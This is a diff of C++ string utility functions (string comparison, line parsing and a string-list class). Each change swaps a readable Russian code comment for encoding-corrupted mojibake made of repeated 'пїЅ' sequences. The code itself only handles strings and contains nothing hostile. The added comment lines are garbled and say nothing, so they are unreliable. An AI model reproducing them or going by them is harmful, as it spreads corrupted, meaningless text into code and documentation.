-	// Функция сравнивает строку Str со строкой ToSame.
-	// CaseSensetive определяет чувствительность к регистру
-	// Если StrEndPosrition не равен нулю, то сравнение
-	// ограничивается StrEndPosrition символами
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ Str пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ ToSame.
+	// CaseSensetive пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅ StrEndPosrition пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ StrEndPosrition пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	if (Str == NULL || ToSame == NULL)
 		return false;
@@ -1387,8 +1398,8 @@ bool StrSame(PCHAR Str, PCHAR ToSame, bool CaseSensetive, DWORD StrEndPosition)
 
 PCHAR STR::IgnoreSpaces(PCHAR Str)
 {
-	// Функция игнорирует пробелы. Функция НЕ изменяет строку, она лишь
-	// возвращает указатель на нужный символ, либо на конец строки
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	PCHAR S = Str;
 	while ((*S != 0) && (*S == ' ' || *S == 9)) S++;
 	return S;
@@ -1412,9 +1423,9 @@ PCHAR STR::Format(PCHAR Str, va_list Arguments)
 
 PCHAR STR::GetLine(PCHAR Str, DWORD StrSize)
 {
-	// Функция возвращает текущую линию в строке.
-	// Линия ограничивается символами 10, 13 либо концом строки
-	// Конец строки ограничивается нулевым символом либо размером StrSize
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
+	// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 10, 13 пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ StrSize
 	if (Str == NULL)
 		return NULL;
 
@@ -1433,8 +1444,8 @@ PCHAR STR::GetLine(PCHAR Str, DWORD StrSize)
 
 PCHAR STR::GotoNextLine(PCHAR Str, DWORD StrSize)
 {
-	// Функция возвращает указатель на первый символ следующей линии в строке
-	// либо на конец строки
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Str == NULL)
 		return NULL;
 	DWORD Pos;
@@ -1483,7 +1494,7 @@ DWORD STR::HexToDWORD(PCHAR Str)
 
 // ----------------------------------------------------------------------------
 //
-//  Набор функция для работы со списками строк Strings
+//  пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ Strings
 //
 // ----------------------------------------------------------------------------
 
@@ -1498,7 +1509,7 @@ typedef struct TStringsRec
 
 PStrings Strings::Create()
 {
-	// Создать набор строк
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	PStringsRec Rec = CreateStruct(TStringsRec);
 
 	Rec->Items = List::Create();
@@ -1513,7 +1524,7 @@ PStrings Strings::Create()
 
 void Strings::Free(PStrings Strings)
 {
-	// Уничтожить набор строк
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	if (Strings == NULL)
 		return;
 
@@ -1527,7 +1538,7 @@ void Strings::Free(PStrings Strings)
 
 void Strings::Clear(PStrings Strings)
 {
-	// Очистить набор строк
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	if (Strings != NULL)
 		List::Clear(PStringsRec(Strings)->Items);
 }
@@ -1535,7 +1546,7 @@ void Strings::Clear(PStrings Strings)
 
 DWORD Strings::Count(PStrings Strings)
 {
-	// Получить количество строк
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	if (Strings == NULL)
 		return 0;
 	return List::Count(PStringsRec(Strings)->Items);
@@ -1544,7 +1555,7 @@ DWORD Strings::Count(PStrings Strings)
 
 int Strings::Add(PStrings Strings, PCHAR Str, bool Duplicate)
 {
-	// Добавить новую строку
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Strings == NULL)
 		return -1;
 	PCHAR Tmp;
@@ -1558,7 +1569,7 @@ int Strings::Add(PStrings Strings, PCHAR Str, bool Duplicate)
 
 void Strings::Delete(PStrings Strings, DWORD Index)
 {
-	// Удалить строку
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Strings == NULL)
 		return;
 
@@ -1568,7 +1579,7 @@ void Strings::Delete(PStrings Strings, DWORD Index)
 
 int Strings::Remove(PStrings Strings, PCHAR Str)
 {
-	// Функция удаляет строку Str из списка
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ Str пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	int Index = IndexOf(Strings, Str);
 	if (Index >= 0)
 		Delete(Strings, Index);
@@ -1578,7 +1589,7 @@ int Strings::Remove(PStrings Strings, PCHAR Str)
 
 int Strings::IndexOf(PStrings Strings, PCHAR Str)
 {
-    // Функция возвращает позицию строки Str в списке
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ Str пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Strings == NULL) return -1;
 	PStringsRec R = (PStringsRec)Strings;
 
@@ -1596,7 +1607,7 @@ int Strings::IndexOf(PStrings Strings, PCHAR Str)
 
 PCHAR Strings::GetItem(PStrings Strings, DWORD Index, bool DuplicateStr)
 {
-	// Получит строку из позиции
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	if (Strings == NULL)
 		return NULL;
@@ -1610,8 +1621,8 @@ PCHAR Strings::GetItem(PStrings Strings, DWORD Index, bool DuplicateStr)
 
 PCHAR Strings::GetText(PStrings Strings, PCHAR LineDelimeter)
 {
-	// Объеденяет все строки в одну. Если не указан
-	// разделитель то использован разделитель заданный в настройках
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Strings == NULL)
 		return NULL;
 
@@ -1621,7 +1632,7 @@ PCHAR Strings::GetText(PStrings Strings, PCHAR LineDelimeter)
 	if (Count == 0)
 		return NULL;
 
-	// Инициализируем разделитель строк
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	PCHAR Del;
 	DWORD DelLen;
 
@@ -1640,7 +1651,7 @@ PCHAR Strings::GetText(PStrings Strings, PCHAR LineDelimeter)
 	DWORD TotalLen = 0;
 	DWORD i;
 
-	// Рсчитываем длину строки
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	for (i = 0; i < Count; i++)
 	{
 		S = (PCHAR)List::GetItem(SR->Items, i);
@@ -1649,7 +1660,7 @@ PCHAR Strings::GetText(PStrings Strings, PCHAR LineDelimeter)
 			TotalLen += DelLen;
 	}
 
-	// Собираем строку
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	DWORD L;
 	PCHAR Result = STR::Alloc(TotalLen);
 	STRHEAD::SetLength(Result, TotalLen);
@@ -1678,16 +1689,16 @@ PCHAR Strings::GetText(PStrings Strings, PCHAR LineDelimeter)
 
 void Strings::SetText(PStrings Strings, PCHAR Text)
 {
-	// Функция разбирает текст на строки разделённые символами новой
-	// строки и перевода каретки
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	if (Strings == NULL || Text == NULL)
 		return;
 	PStringsRec SR = (PStringsRec)Strings;
-	// очищаем список
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	List::Clear(SR->Items);
 
-	//Парсим текст
+	//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	PCHAR Start = Text;
 	PCHAR End;
 	PCHAR Line;
@@ -1696,11 +1707,11 @@ void Strings::SetText(PStrings Strings, PCHAR Text)
 	DWORD StrLen;
 	while (*Start != 0)
 	{
-		// Ищем конец строки
+		// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		End = Start;
 		while (*End != 0 && *End != 10 && *End != 13) End++;
 
-		// Создаём строку
+		// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		StrLen = End - Start;
 		if (StrLen != 0)
 			Line = STR::New(Start, StrLen);
@@ -1708,7 +1719,7 @@ void Strings::SetText(PStrings Strings, PCHAR Text)
 			Line = NULL;
 		List::Add(SR->Items, Line);
 
-		// Переходим на следующую строку
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		Flag = 0;
 		while (*End != 0)
 		{
@@ -1733,8 +1744,8 @@ void Strings::SetText(PStrings Strings, PCHAR Text)
 
 int Strings::AddValue(PStrings Strings, PCHAR Name, PCHAR Value, PCHAR Delimeter)
 {
-	// Добавить в список пару Имя=Значение.
-	// Если не указан разделитель то будет взят из настроек списка (по умолчанию =)
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ=пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+	// пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ =)
 
 	if (Strings == NULL || Name == NULL)
 		return NULL;
